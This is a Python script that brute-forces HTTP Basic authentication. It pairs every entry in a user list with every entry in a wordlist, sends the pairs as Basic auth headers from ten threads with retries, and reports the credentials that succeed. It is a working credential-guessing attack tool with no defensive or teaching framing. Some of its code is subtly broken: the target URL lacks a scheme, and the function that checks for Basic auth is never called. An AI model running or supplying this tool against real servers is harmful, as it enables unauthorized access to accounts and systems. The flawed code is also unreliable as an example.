#!/usr/bin/python3
import threading, time, sys, urllib.request, urllib.error, base64
from queue import Queue

m_thr = 10
r_lm = 3
r_t = 5
d_bt = 0.5
s_ev = threading.Event()
p_lk = threading.Lock()
LIME_GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"


idk = """⠀⠀⠀⠀⠀⠀⠀ 
                            ⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣦⣤⣴⣤⣤⣄⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀          ⢀⣀⡀⠀⠀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣛⣻⣿⣦⣀⠀⢀⣀⣀⣏⣹⠀
         ⢠⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿la⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠭⠭⠽⠽⠿⠿⠭⠭⠭⠽⠿⠿⠛
         ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⢻⣿⣿⣿⡟⠏⠉⠉⣿⢿⣿⣿⣿⣇⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀         ⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⢠⣿⣿⣿⠋⠑⠒⠒⠚⠙⠸⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
         ⠀⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀         ⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     """

print(idk)


def tl():
    print(f"\t")
    print("\t")


def tm():
    n = time.localtime(time.time())
    return time.asctime(n)

def ld(f_p):
    try:
        with open(f_p, "r") as f:
            return [l.strip() for l in f.readlines()]
    except IOError:
        with p_lk:
            print(f"{RED}Error: Check your file path - {f_p}{RESET}\n")
        sys.exit(1)

def ga(u):
    rq = urllib.request.Request(u)
    e = None
    try:
        urllib.request.urlopen(rq, timeout=r_t)
    except urllib.error.URLError as err:
        e = err
    else:
        with p_lk:
            print(f"{RED}This page isn't protected by basic authentication.{RESET}\n")
        sys.exit(1)
    if not e or not hasattr(e, 'code') or e.code != 401:
        with p_lk:
            print(f"{RED}\nThis page isn't protected by basic authentication.{RESET}")
            print("But we failed for another reason.\n")
        sys.exit(1)
    a_ln = e.headers.get('WWW-Authenticate', '')
    if not a_ln:
        with p_lk:
            print(f"{RED}\nA 401 error without a basic authentication response header.{RESET}\n")
        sys.exit(1)
    else:
        return a_ln

class Wkr(threading.Thread):
    def __init__(self, q, s, p):
        threading.Thread.__init__(self)
        self.q = q
        self.s = s
        self.p = p

    def run(self):
        while not self.q.empty() and not s_ev.is_set():
            u, p = self.q.get()
            self.at(u, p)
            self.q.task_done()
            time.sleep(d_bt)

    def at(self, u, p):
        a = 0
        sc = False
        while a < r_lm and not sc and not s_ev.is_set():
            try:
                au_str = f"{u}:{p}"
                b64 = base64.b64encode(au_str.encode()).decode()
                h = {"Authorization": f"Basic {b64}"}
                rq = urllib.request.Request(self.s, headers=h)
                with urllib.request.urlopen(rq, timeout=r_t):
                    with p_lk:
                        print(f"{LIME_GREEN}SUCCESS: Username: {u} Password: {p}{RESET}")
                    s_ev.set()
                    sc = True
            except urllib.error.HTTPError as e:
                with p_lk:
                    print(f"{RED}Failed Login - User: {u} Password: {p}{RESET}")
                if e.code != 401:
                    print(f"{RED}Error Code: {e.code}{RESET}")
            except urllib.error.URLError:
                with p_lk:
                    print(f"{RED}Connection error for {u}:{p} - Retry {a + 1}{RESET}")
            except Exception as e:
                with p_lk:
                    print(f"{RED}Unexpected error for {u}:{p} - {e}{RESET}")
            a += 1

def mn():
    if len(sys.argv) != 5:
        tl()
        print(f"          Usage: ./bruteforce.py <server> <port> <userlist> <wordlist>")
        print(f"      Example: python3 bruteforce.py example.com 2082 users.txt wordlist.txt\n")
        sys.exit(1)

    srv = f"{sys.argv[1]}:{sys.argv[2]}"
    usrs = ld(sys.argv[3])
    wrds = ld(sys.argv[4])

    q = Queue()
    for u in usrs:
        for w in wrds:
            q.put((u, w))

    print(f"{LIME_GREEN}[+]{RESET} Server:", srv)
    print(f"{LIME_GREEN}[+]{RESET} Users Loaded:", len(usrs))
    print(f"{LIME_GREEN}[+]{RESET} Words Loaded:", len(wrds))
    print(f"{LIME_GREEN}[+]{RESET} Started ", tm(), "\n")

    ts = []
    for _ in range(m_thr):
        t = Wkr(q, srv, sys.argv[2])
        t.setDaemon(True)
        t.start()
        ts.append(t)

    q.join()
    print(f"\n{LIME_GREEN}[-]{RESET} Done -", tm(), "\n")

if __name__ == "__main__":
    mn()
